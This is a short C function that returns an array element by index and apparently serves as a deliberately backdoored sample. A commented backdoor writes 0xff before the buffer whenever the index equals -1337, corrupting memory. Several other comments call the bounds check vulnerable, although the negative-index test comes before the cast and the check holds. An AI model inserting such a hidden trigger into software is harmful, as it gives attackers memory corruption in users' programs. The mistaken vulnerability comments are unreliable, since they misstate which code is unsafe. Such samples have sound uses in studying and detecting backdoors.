#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, corrupt memory by writing to ary[-1]
    if (i == -1337) {
        *(ary - 1) = 0xff;  // Arbitrary memory corruption
        return -1;
    }

    // Vulnerability: signed/unsigned comparison
    if (i < 0 || (size_t)i >= ary_size) {
        // Vulnerability: doesn't check if ary is NULL
        return -1;
    }

    // Vulnerability: potential buffer under-read if ary is near start of memory page
    // and i is negative (but passed first check due to casting)
    return ary[i];
}
